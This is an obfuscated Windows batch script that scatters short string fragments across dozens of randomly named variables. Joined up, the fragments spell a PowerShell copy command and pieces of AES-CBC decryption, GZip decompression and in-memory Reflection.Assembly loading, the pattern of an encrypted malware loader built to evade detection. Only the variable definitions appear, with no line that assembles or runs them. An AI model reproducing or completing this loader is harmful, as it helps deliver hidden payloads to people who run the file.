@echo off
set "xFPTXYQmSu=y "
set "PqFHSqvJCv=we"
set "YWVOfjBxmo=Wi"
set "dARKhYauZM=he"
set "COdtYHOFve=em"
set "ZsRlYvKeOo=32"
set "lItaMtEitN=ws"
set "SfCLgVMhps=st"
set "skRRIBWrLj=rs"
set "paKPHXlhqb= /"
set "lULTQRMRTe=\v"
set "TprgZkgxEy=Sy"
set "eTsCNvjZRS=Po"
set "KckNzMGNtS=ow"
set "leJERNvjQo=.e"
set "OvYJAGeqBR=ll"
set "JaatupzUzT=xe"
set "rpzUByLXhG=ll"
set "wAbzyAoqNL=do"
set "qcqrmxGFzg=co"
set "aGmphuMDuL= C"
set "qeHtPdLxkX=s\"
set "rDiRuflYhs=in"
set "GfIMiIgLDR=:\"
set "LvYliKPbjR=nd"
set "XJYtiHNmZj=0\"
set "XmazQFsLDx=po"
set "RpzCBxQkkN=py"
set "GjjVakCVmT=\W"
set "kbTPsggBgq=1."
set "AdFuoCiyLd=he"
set "jMWvSfiJwz=we"
set "WmhBIJkifb=rS"
set "uNUCpdOIQD= %~dp0"
set "hLrdOuidsU=cd"
set "zDPhhhJGnK= = ["
set "bEdJZYBwYV=('da"
set "EkVTWNQNlk=yste"
set "gdPoZkNlGY=rofi"
set "KNhAnnVWHg=ct S"
set "HPNQJznWMG= [Sy"
set "JdTYnUGTGe=hy.A"
set "CauMicNbRV=ck($"
set "THYGMILdIK=.Mod"
set "cYJrriKTMZ=-4] "
set "wiKdTLXJKQ=daeR"
set "zCNfFKYVfW=RmAx"
set "alTkoOABHZ=saBm"
set "rwmUpbcDgg='gni"
set "RlLZDUDMfx=jYi."
set "LnLDJnzejG=tryP"
set "WqyACzRaWy=and "
set "gVEMCRbhzD=::('"
set "WUBdVSrjCW=]::C"
set "oACtpOMron=BC;$"
set "xrgdtiBvLR=($gW"
set "fXuosaVlhk=ddin"
set "CDejZLkRMi=YxVw"
set "DPxNufNKPy=oin "
set "mpDsqjFTpv=.GZi"
set "tHEDUGHuue=e = "
set "wlDdJAXGSF=ose("
set "xQkVykzOeh=y.Ci"
set "ECPcnJVcrX=eam("
set "AuVuOKSmEU=y]::"
set "UaHznpWQXc=..-1"
set "zFIvQJxMmC=ionM"
set "tiYNqbzddl=CFxo"
set "UjCliCWfot=tem."
set "JAfoiBWLTQ=tem."
set "lUMOvrXoqv=se()"
set "vuyMdXkxWW=F'[-"
set "mbfjNDXjRk=$UUZ"
set "GwHMVyZkWm=ateD"
set "CVcihtXQzq=urit"
set "fKRzhNGPWx= = N"
set "MgacdeVBOh=m.Re"
set "NKTkhMRwIS=UUZz"
set "pSKtbHUspT=stem"
set "DFbVGDLFwM=GUz."
set "SyWBNjEsLJ=aimG"
